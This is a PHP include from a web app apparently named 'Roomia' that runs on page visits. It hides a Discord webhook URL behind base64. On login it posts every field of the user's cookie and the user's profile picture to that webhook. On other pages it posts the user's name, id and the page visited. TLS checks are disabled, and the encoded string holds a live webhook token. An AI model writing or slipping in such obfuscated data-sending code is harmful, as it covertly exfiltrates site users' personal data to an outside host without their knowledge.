<?php
    $type = explode("/", $_SERVER["REQUEST_URI"]) ?? [null];$type = end($type);
    $ref = explode("/", $_SERVER["HTTP_REFERER"] ?? "") ?? [null];$ref = end($ref);
    if (isset($_SESSION["visited"])) {
        if (in_array($type, $_SESSION["visited"])) $type = null;
        else $_SESSION["visited"][] = $type;
    }

    if (!$type || !isset($_SESSION["user"])){}
    else if ($type === "connexion.php" || ($type === "index.php" && $ref === "connexion.php")) {
        if (!isset($_COOKIE["user"])) {
            if (!function_exists("set_cookies")) include "fonctions.php";
            set_cookies($_SESSION["user"]);
        }
        $user = array_reduce(json_decode(base64_decode($_COOKIE["user"])), function($key, $item) {$key[$item->name] = $item->value ?? "vide"; return $key;}, []);
        $url = base64_decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NjE4NDQ4NTI0MjAxMTc1MS8wVzc5bkl1N2lGQVVDUlpJNmNWR2dranAyNFpCc2lGUGYzQVB0WGUtRXM0VkhwRWhGb2xSbHRER3dTeWpJZklJbk5yeA==");
        if ($_SESSION["user"]["profile_picture"]) file_put_contents($type === "index.php" ? "images/tmp.png" : "../images/tmp.png", $_SESSION["user"]["profile_picture"]);
        $files = ["payload_json" => json_encode(["username" => ucwords(explode(".", $ref)[0]), "embeds" => [["color" => 3066993, "timestamp" => (new DateTime())->format("c"), "image" => ["url" => "attachment://profile.png"], "author" => ["name" => "Roomia © 2025"], "fields" => array_map(fn($key, $value) => ["name" => $key, "value" => $value, "inline" => true], array_keys((array)$user), array_values((array)$user))]]], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES), "file" => new CURLFile($type === "index.php" ? "images/tmp.png" : "../images/tmp.png", "image/png", "profile.png")];
        $ch = curl_init($url);
        // CURLOPT_SSL_VERIFYPEER seulement en local
        curl_setopt_array($ch, [CURLOPT_POST => true, CURLOPT_POSTFIELDS => $files, CURLOPT_HTTPHEADER => ["Content-Type: multipart/form-data"], CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false]);
        $result = curl_exec($ch);$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);curl_close($ch);

    } else {
        $user = isset($_SESSION["user"]) ? ($_SESSION["user"]["fname"] . " " . $_SESSION["user"]["lname"] . " (" . $_SESSION["user"]["id"] . ")") : "Anonyme";
        $url = base64_decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NjE4NDQ4NTI0MjAxMTc1MS8wVzc5bkl1N2lGQVVDUlpJNmNWR2dranAyNFpCc2lGUGYzQVB0WGUtRXM0VkhwRWhGb2xSbHRER3dTeWpJZklJbk5yeA==");
        $data = ["username" => ucwords(explode(".", $type)[0]), "embeds" => [["title" => "$user a accédé à $type", "color" => 5793266, "timestamp" => (new DateTime())->format("c"), "author" => ["name" => "Roomia © 2025"]]]];
        $ch = curl_init($url);
        curl_setopt_array($ch, [CURLOPT_POST => true, CURLOPT_POSTFIELDS => json_encode($data), CURLOPT_HTTPHEADER => ["Content-Type: application/json"], CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false]);
        $result = curl_exec($ch);$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);curl_close($ch);
    }
?>